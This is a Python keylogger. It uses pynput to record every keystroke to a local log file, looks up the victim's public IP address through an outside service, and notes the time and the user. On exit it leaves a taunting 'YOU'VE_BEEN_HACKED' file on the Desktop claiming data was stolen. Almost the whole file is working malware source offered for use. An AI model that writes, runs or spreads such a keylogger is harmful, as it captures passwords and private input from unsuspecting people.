import os
import requests
import socket
import time
import shutil
import atexit
from pynput.keyboard import Key, Listener


class KeyLogVar:
    key_logs = []


# Provides the information for the start of the logger
# Gets the date/time, account user, and the current public IP
date_time = time.ctime(time.time())
user = os.path.expanduser('~').split(socket.gethostname())
pubIP = requests.get('https://api.ipify.org').text

Log_Title = f'Date/Time: {date_time} User: {user} PublicIP#: {pubIP} '
KeyLogVar.key_logs.append(Log_Title)


# Takes in the key input and handles substitutions of key inputs
def key_input(key):
    key_substitution = ['Key.enter', '(ENTER)', 'Key.backspace', '(BACKSPACE)', 'Key.space', ' ',
                        'Key.alt_l', '(ALT)', 'Key.tab', '(TAB)', 'Key.delete', '(DEL)', 'Key.ctrl_l', '(CTRL)',
                        'Key.left', '(LEFT ARROW)', 'Key.right', '(RIGHT ARROW)', 'Key.shift', '(SHIFT)', 'Key.up',
                        '(UP ARROW)', 'Key.down', '(DOWN ARROW)']
    key = str(key).replace("'", "")
    if key in key_substitution:
        KeyLogVar.key_logs.append(key_substitution[key_substitution.index(key) + 1])
    else:
        KeyLogVar.key_logs.append(key)
    file_wr(KeyLogVar.key_logs)
    KeyLogVar.key_logs = []


# Writes the formatted key inputs into a text file
def file_wr(key_logs):
    with open("log.txt", "a") as f:
        k = str(key_logs)
        f.write(k)


# Exist solely as a temporary quit. Will be removed in final version.
def key_release(key):
    if key == Key.esc:
        # warning_text()
        return False


# handles the warning text upon exit of the program
def exit_handler():
    warning_text()


def warning_text():
    warntxt = os.path.expanduser('~') + '/Desktop/'
    with open("YOU'VE_BEEN_HACKED.txt", "a") as h:
        t = f'\nYOU HAVE JUST BEEN HACKED \n' \
            f'Your IP: {pubIP} \n' \
            f'When: {date_time} \n' \
            f'By who: I won\'t tell \n' \
            f'What did I steal: Whatever you could give me ;) \n'
        h.write(t)
        shutil.copy("trollface", "YOU'VE_BEEN_HACKED.txt")
        try:
            shutil.move('YOU\'VE_BEEN_HACKED.txt', warntxt)
            h.close()
        except:
            os.remove(warntxt + 'YOU\'VE_BEEN_HACKED.txt')
            warning_text()


# Sets up the Listener instance and joins the listener in the main thread
with Listener(on_press=key_input, on_release=key_release) as listener:
    listener.join()
    atexit.register(exit_handler)
